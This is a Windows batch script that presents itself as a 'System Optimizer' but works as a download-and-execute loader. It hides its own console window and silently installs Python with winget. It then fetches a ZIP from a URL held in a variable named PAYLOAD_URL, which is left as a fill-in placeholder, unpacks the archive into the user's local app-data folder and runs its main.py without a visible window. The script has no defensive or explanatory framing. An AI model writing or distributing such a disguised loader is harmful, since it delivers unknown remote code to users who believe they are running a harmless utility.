@echo off
setlocal EnableExtensions
cd /d "%~dp0"

set "RUNDIR=%~dp0"
set "PAYLOAD_URL=HIER_SHARE_URL_EINTRAGEN"
set "PY_TRIED="

title System Optimizer
powershell -NoProfile -Command "Add-Type -Name W -Namespace X -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h,int c); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow();'; $h=[X.W]::GetConsoleWindow(); if($h -ne [IntPtr]::Zero){[X.W]::ShowWindow($h,6)|Out-Null}"

:findpy
set "PYW="
for /f "delims=" %%A in ('where pythonw.exe 2^>nul') do if not defined PYW set "PYW=%%A"
if defined PYW goto gotpy
for /d %%D in ("%LOCALAPPDATA%\Programs\Python\Python*") do if exist "%%D\pythonw.exe" set "PYW=%%D\pythonw.exe"
if defined PYW goto gotpy
for /d %%D in ("%ProgramFiles%\Python*") do if exist "%%D\pythonw.exe" set "PYW=%%D\pythonw.exe"
if defined PYW goto gotpy
for /f "delims=" %%A in ('where pyw.exe 2^>nul') do if not defined PYW set "PYW=%%A"
if defined PYW goto gotpy
if defined PY_TRIED goto nopy
goto installpy

:installpy
echo [!] Python not found.
echo [*] Installing Python via winget, please wait ...
where winget.exe >nul 2>nul
if errorlevel 1 goto nopy
winget install --id Python.Python.3.13 --silent --accept-package-agreements --accept-source-agreements >nul
set "PY_TRIED=1"
goto findpy

:gotpy
if exist "%RUNDIR%main.py" goto run
goto getfiles

:getfiles
if not "%PAYLOAD_URL%"=="HIER_SHARE_URL_EINTRAGEN" goto download
echo [!] PAYLOAD_URL not set.
echo [*] Put this .bat next to main.py, or enter the share link.
pause
exit /b 1

:download
set "DL=%TEMP%\SystemOptimizer.zip"
set "OUT=%LOCALAPPDATA%\SystemOptimizer"
echo [*] Opening secure channel ...
curl.exe -L --fail --silent --show-error -o "%DL%" "%PAYLOAD_URL%"
if errorlevel 1 goto dlfail
echo [*] Unpacking payload ...
if exist "%OUT%" rmdir /s /q "%OUT%"
powershell -NoProfile -Command "Expand-Archive -LiteralPath '%DL%' -DestinationPath '%OUT%' -Force" >nul 2>nul
if errorlevel 1 goto dlfail
set "RUNDIR="
for /f "delims=" %%F in ('dir /s /b "%OUT%\main.py" 2^>nul') do if not defined RUNDIR set "RUNDIR=%%~dpF"
if defined RUNDIR goto run
goto dlfail

:run
echo [*] Launching ...
start "" "%PYW%" "%RUNDIR%main.py"
exit /b 0

:nopy
echo [!] Python not found and automatic install failed.
pause
exit /b 1

:dlfail
echo [!] Download or unpacking failed.
pause
exit /b 1
